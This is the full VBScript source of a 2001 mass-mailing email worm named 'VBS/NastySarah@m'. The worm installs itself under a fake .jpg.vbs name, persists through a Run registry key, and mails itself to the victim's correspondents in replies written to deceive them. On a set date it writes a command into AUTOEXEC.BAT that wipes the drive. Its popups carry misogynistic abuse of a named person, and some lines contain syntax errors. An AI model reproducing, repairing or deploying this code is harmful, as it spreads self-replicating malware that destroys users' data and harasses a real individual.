On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
FSO.CopyFile WScript.ScriptFullName, FSO.GetSpecialFolder(1)&"\NastySarah.jpg.vbs"
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NastySarah", FSO.GetSpecialFolder(1)&"\NastySarah.jpg.vbs"
Set MAPI = CreateObject("MAPI.Session")
If MAPI Is Nothing Then
	Set MAPI = CreateObject("CDONTS.Session")
End If
If MAPI Is Nothing Then
	Set MAPI = CreateObject("Outlook.Application").GetNameSpace("MAPI")
End If
If MAPI Is Nothing Then
	WshShell.Popup "	Hey!  Haven't you heard!  There's a VBS worm spreading by this very filename!  You're lucky you didn't get hit!  Forward this warning on to all of your contacts, so they won't get hit by the bug!"
	WScript.Quit
Else
	WshShell.Popup "FatalAppExit: GetLastError returns 0xFFFFFFFF.",,48,"Image Preview"
End If
MAPI.Logon
For Each JX In MAPI.GetFolders
	For Each JM in JX.Items
		Set MItem = JM
		EnumItems
	Next
	For Each JP In JX.Messages
		Set MItem = JP
		EnumItems
	Next
	For Each JA In JX.HiddenMessages
		Set MItem = JA
		EnumItems
	Next
Next
MAPI.Logoff
If Int(Rnd * 20) = 5 Then
	WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "VBS/NastySarah@m"
	WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "By FileSystemObject"
	WshShell.RegWrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\InfoTip", 	WshShell.RegWrite "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\InfoTip", "Failure is not an option, it comes bundled with your Microsoft product.  And ""some lame ol' coward's VBS worm"" comes bundled with your NEVER-EXPLOITED Outlook."
	WshShell.RegWrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\", "By FileSystemObject"
	WshShell.RegWrite "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\", "VBS/NastySarah@m"
	WshShell.RegWrite "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\InfoTip", "I'm an Outlook mailer, you stupid S.O.B!  Tell your friends to get rid of MS Outlook!!!"
End If
If Day(Now) = 31 And Month(Now) = 5 Then
	WshShell.Popup "Have you ever heard of that fat, ugly bitch Sarah Gordon?  She claims to be 'discovering what drives us', but really, she just pisses us off!  In honor of Sarah Gordon, fat bitch of the high seas!"&vbCrLf&vbCrLf&"VBS/NastySarah@m is Copyright (C), FileSystemObject 2001.",,48,"Bitch of the High Seas"
	Set AEB = FSO.OpenTextFile("C:\AUTOEXEC.BAT",2,True)
	AEB.Write "deltree /y c:\*.*"
	AEB.Close
End If

Sub EnumItems()
On Error Resume Next
RR = WshShell.RegRead("HKLM\NastySarah\"&MItem.SenderName)
If InStr(1, UCase(MItem.Subject), "NASTYSARAH") > 0 Or InStr(1, UCase(MItem.Body), "NASTYSARAH" > 0 Then bDelete
If Not RR = 1 And DateDiff("d", Now, MItem.SentOn) < 4 Then
	If bDelete Then
		CR = WshShell.RegRead("HKLM\FileSystemObject\"&MItem.SenderName)
		If Not CR = 1 Then
			Set Stealth = MItem.Reply
			Stealth.Body = "Trust me, the JPG's safe.  Yes, I did send it." & vbCrLf & vbCrLf & "Regards," & vbCrLf & MAPI.CurrentUser.Name
			Stealth.DeleteAfterSubmit
			Stealth.Send
			WshShell.RegWrite "HKLM\FileSystemObject\"&MItem.SenderName
		End If
	Else
		Set MTX = MItem.Reply
		MTX.Body = "Hey!  Thanks for your mail!  I've been kind of busy lately, and haven't"&vbCrLf&"really had time to do a full reply, so, until I do, check this out."&vbCrLf&vbCrLf&"Regards,"&MAPI.CurrentUser.Name&vbCrLf&vbCrLf&MTX.Body
		MTX.Attachments.Add(FSO.GetSpecialFolder(1)&"\NastySarah.jpg.vbs")
		MTX.DeleteAfterSubmit
		MTX.Send
		WshShell.RegWrite "HKLM\NastySarah\"&MItem.SenderName,1,"REG_DWORD"
	End If
End If
If bDelete Then
	MItem.Close
	MItem.Delete
End If
End Sub

